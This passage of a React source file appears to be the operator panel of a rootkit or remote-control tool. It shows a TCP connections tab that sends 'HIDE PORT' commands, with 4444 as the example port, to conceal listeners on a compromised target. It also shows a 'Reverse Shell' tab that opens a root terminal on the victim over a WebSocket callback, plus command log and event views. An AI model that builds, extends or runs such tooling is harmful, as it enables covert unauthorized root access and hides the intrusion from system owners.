          }).filter(Boolean)
        } else {
          const TCP_STATES = { '01': 'ESTABLISHED', '02': 'SYN_SENT', '06': 'TIME_WAIT', '0A': 'LISTEN' }
          parsed = lines.slice(1).map(line => {
            const parts = line.trim().split(/\s+/)
            if (parts.length < 4) return null
            const localHex = parts[1] || ''
            const foreignHex = parts[2] || ''
            const parseAddr = (h) => {
              const [aH, pH] = h.split(':')
              if (!pH) return { addr: '?', port: '0' }
              const a = parseInt(aH, 16)
              return { addr: `${a & 0xff}.${(a >> 8) & 0xff}.${(a >> 16) & 0xff}.${(a >> 24) & 0xff}`, port: parseInt(pH, 16).toString() }
            }
            const loc = parseAddr(localHex)
            const rem = parseAddr(foreignHex)
            const state = TCP_STATES[parts[3]] || parts[3]
            return { proto: 'tcp', local: `${loc.addr}:${loc.port}`, foreign: `${rem.addr}:${rem.port}`, port: loc.port, state, proc: '-' }
          }).filter(Boolean)
        }
        snap.set(parsed)
      } else {
        snap.fail(r.output || 'failed')
      }
      snap.setLoading(false)
    })
  }, [execCmd, t.id, snap])

  const [panel, setPanel] = useState('scan')
  const ports = snap.data || []

  if (!snap.time && !snap.loading)
    return <EmptySnapshotCta icon={Network} title="TCP Connections"
      subtitle="Scan for TCP connections and listeners (close any active shell first)"
      onCapture={capture} online={t.online} loading={snap.loading} />

  return (
    <div className="flex flex-col h-full">
      <SnapshotBar title="TCP Connections" icon={Network} count={ports.length} hiddenCount={hiddenPorts.length}
        time={snap.time} loading={snap.loading} onSnapshot={capture} online={t.online}>
        <div className="flex border-2 border-border rounded-[var(--radius)] overflow-hidden shrink-0 ml-2">
          <button
            className={`px-3 py-1 text-sm font-bold ${panel === 'scan' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('scan')}
          >Scan</button>
          <button
            className={`px-3 py-1 text-sm font-bold border-l-2 border-border ${panel === 'hidden' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('hidden')}
          >Hidden {hiddenPorts.length}</button>
        </div>
      </SnapshotBar>
      {panel === 'scan' ? (
        <>
          {snap.error && (
            <div className="p-6 text-center">
              <div className="text-red font-bold mb-1">Scan failed</div>
              <div className="text-sm text-fg-3">{snap.error.includes('ticket') || snap.error.includes('busy')
                ? 'Close the active shell session first, then retry.'
                : snap.error}</div>
            </div>
          )}
          {!snap.error && !ports.length && !snap.loading ? (
            <div className="flex-1 flex items-center justify-center text-fg-3 text-sm">
              No TCP connections found
            </div>
          ) : !snap.error && ports.length > 0 && (
          <div className="flex-1 overflow-auto">
            <table className="w-full text-sm">
              <thead className="sticky top-0 bg-secondary border-b-2 border-border">
                <tr><Th>Proto</Th><Th>Local Address</Th><Th>Foreign Address</Th><Th>Port</Th><Th>State</Th><Th></Th></tr>
              </thead>
              <tbody>
                {ports.map((p, i) => {
                  const isHidden = hiddenPorts.includes(p.port)
                  return (
                    <tr key={i} className={`border-b border-border hover:bg-bg-2 group ${isHidden ? 'opacity-40' : ''}`}>
                      <td className="px-4 py-2 font-mono text-fg-3">{p.proto}</td>
                      <td className="px-4 py-2 font-mono">{p.local}</td>
                      <td className="px-4 py-2 font-mono text-fg-3">{p.foreign || '-'}</td>
                      <td className="px-4 py-2 font-mono font-bold">{p.port}</td>
                      <td className="px-4 py-2">{p.state}</td>
                      <td className="px-4 py-2 text-right">
                        <button
                          className={`p-1 transition-opacity ${isHidden ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                          title={isHidden ? 'Unhide port' : 'Hide port'}
                          onClick={() => {
                            if (isHidden) {
                              const idx = hiddenPorts.indexOf(p.port)
                              if (idx >= 0) cmd(`UNHIDE PORT ${idx}`)
                            } else {
                              cmd(`HIDE PORT ${p.port}`)
                            }
                          }}
                        >
                          {isHidden ? <Eye size={14} /> : <EyeOff size={14} />}
                        </button>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
          )}
        </>
      ) : (
        <div className="flex-1 overflow-auto">
          <HiddenSummary title="Hidden Ports" icon={Network} items={hiddenPorts}
            onRemove={i => cmd(`UNHIDE PORT ${i}`)} onAdd={v => cmd(`HIDE PORT ${v}`)} placeholder="4444" />
        </div>
      )}
    </div>
  )
}

/* -- Shell --------------------------------------------------- */

function ShellTab({ target: t }) {
  const termRef = useRef(null)
  const wsRef = useRef(null)
  const xtermRef = useRef(null)
  const [status, setStatus] = useState('idle')

  const initTerm = useCallback(async () => {
    if (xtermRef.current) return
    const { Terminal } = await import('@xterm/xterm')
    const { FitAddon } = await import('@xterm/addon-fit')
    await import('@xterm/xterm/css/xterm.css')
    const term = new Terminal({
      cursorBlink: true, fontSize: 13,
      fontFamily: 'JetBrains Mono, Fira Code, monospace',
      theme: {
        background: '#1a1028', foreground: '#e2ddf0', cursor: '#a78bfa',
        selectionBackground: '#463960',
        black: '#1a1028', red: '#dc2626', green: '#16a34a', yellow: '#eab308',
        blue: '#7c3aed', magenta: '#a78bfa', cyan: '#22d3ee', white: '#e2ddf0',
      },
    })
    const fitAddon = new FitAddon()
    term.loadAddon(fitAddon)
    if (!termRef.current) { term.dispose(); return }
    term.open(termRef.current)
    fitAddon.fit()
    xtermRef.current = term
    term.onData((data) => {
      if (wsRef.current?.readyState === WebSocket.OPEN) wsRef.current.send(data)
    })
    const ro = new ResizeObserver(() => fitAddon.fit())
    ro.observe(termRef.current)
    term._ro = ro
  }, [])

  const connect = useCallback(async () => {
    if (wsRef.current) return
    setStatus('connecting')
    await initTerm()

    const host = location.hostname || 'localhost'
    const port = location.port === '5173' ? 8080 : (location.port || '8080')
    const ws = new WebSocket(`ws://${host}:${port}/shell?target=${encodeURIComponent(t.id)}`)
    ws.binaryType = 'arraybuffer'
    wsRef.current = ws
    ws.onmessage = (e) => {
      if (typeof e.data === 'string') {
        const msg = JSON.parse(e.data)
        if (msg.type === 'ready') {
          setStatus('connected')
          if (xtermRef.current) xtermRef.current.focus()
        } else if (msg.type === 'error') {
          setStatus('error')
          if (xtermRef.current) xtermRef.current.writeln(`\r\n\x1b[31m${msg.msg}\x1b[0m`)
        }
      } else if (xtermRef.current) {
        xtermRef.current.write(new Uint8Array(e.data))
      }
    }
    ws.onclose = () => {
      wsRef.current = null
      setStatus('disconnected')
      if (xtermRef.current) xtermRef.current.writeln('\r\n\x1b[33m[session ended]\x1b[0m')
    }
    ws.onerror = () => ws.close()
  }, [t.id, initTerm])

  const disconnect = useCallback(() => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null }
  }, [])

  useEffect(() => () => {
    if (wsRef.current) wsRef.current.close()
    wsRef.current = null
    if (xtermRef.current) {
      if (xtermRef.current._ro) xtermRef.current._ro.disconnect()
      xtermRef.current.dispose()
      xtermRef.current = null
    }
  }, [])

  const active = status === 'connected' || status === 'connecting' || status === 'disconnected' || status === 'error'

  return (
    <div className="flex flex-col h-full">
      {active ? (
        <>
          <div className="flex items-center gap-2 px-4 py-2 border-b-2 border-border bg-bg-2">
            <SquareTerminal size={14} className="text-fg-3" />
            <span className="text-sm font-bold uppercase tracking-wide">root@target</span>
            <span className={`inline-block w-2 h-2 rounded-full ${
              status === 'connected' ? 'bg-green-500' :
              status === 'connecting' ? 'bg-yellow-500 animate-pulse' :
              'bg-neutral-500'
            }`} />
            <span className="text-xs text-fg-3">
              {status === 'connected' ? 'live' : status === 'connecting' ? 'opening...' : 'closed'}
            </span>
            <div className="ml-auto flex items-center gap-2">
              {(status === 'disconnected' || status === 'error') && (
                <button className="nb-btn-main px-3 py-1 text-xs" onClick={connect} disabled={!t.online}>
                  Reconnect
                </button>
              )}
              {(status === 'connected' || status === 'connecting') && (
                <button className="nb-btn px-3 py-1 text-xs" onClick={disconnect}>
                  Disconnect
                </button>
              )}
            </div>
          </div>
          <div ref={termRef} className="flex-1 bg-[#1a1028]" style={{ padding: '8px' }} />
        </>
      ) : (
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center">
            <div className="mx-auto w-12 h-12 rounded-lg bg-[#1a1028] flex items-center justify-center mb-4">
              <SquareTerminal size={22} className="text-[#a78bfa]" />
            </div>
            <div className="font-bold mb-0.5">Reverse Shell</div>
            <div className="text-xs text-fg-3 mb-4">Root PTY via SHELL callback</div>
            <button
              className="nb-btn-main px-4 py-2 text-sm font-bold flex items-center gap-2 mx-auto"
              onClick={connect}
              disabled={!t.online}
            >
              <SquareTerminal size={14} /> Connect
            </button>
            {!t.online && (
              <div className="text-xs text-red mt-3">Target offline</div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

/* -- Tables -------------------------------------------------- */

function Th({ children }) {
  return <th className="text-left px-4 py-2.5 font-bold text-xs uppercase tracking-wide">{children}</th>
}

/* -- Log + Events -------------------------------------------- */

function LogTab({ entries }) {
  if (!entries.length) return <div className="p-8 text-center text-fg-3">No commands sent yet</div>
  return (
    <div className="overflow-auto">
      <table className="w-full text-sm">
        <thead>
          <tr className="border-b-2 border-border bg-bg-2 sticky top-0">
            <Th>Time</Th><Th>Command</Th><Th>Status</Th><Th>Response</Th>
          </tr>
        </thead>
        <tbody>
          {entries.map((l, i) => (
            <tr key={i} className="border-b border-border">
              <td className="px-4 py-2 font-mono text-fg-3">{l.time}</td>
              <td className="px-4 py-2 font-mono font-bold">{l.cmd}</td>
              <td className="px-4 py-2"><StatusPill ok={l.ok} /></td>
              <td className="px-4 py-2 font-mono text-fg-3 truncate max-w-xs">{l.reply}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

function EventsTab({ events }) {
  if (!events.length) return <div className="p-8 text-center text-fg-3">No events yet</div>
  return (
    <div className="overflow-auto">
      {[...events].reverse().map((e, i) => (
        <div key={i} className="flex items-center gap-4 px-4 py-2.5 border-b border-border hover:bg-bg-2">
          <span className="font-mono text-sm text-fg-3 w-16 shrink-0">{e.time}</span>
          <EventBadge type={e.type} />
          <span className="font-mono text-sm text-fg-2">{e.msg}</span>
        </div>
      ))}
    </div>
  )
}

function EventBadge({ type }) {
  const colors = { connect: 'bg-green text-white', disconnect: 'bg-red text-white', cmd: 'bg-blue text-white', sys: 'bg-bg-2' }
  return <span className={`nb-badge ${colors[type] || 'bg-bg-2'} w-24 justify-center`}>{type}</span>
}
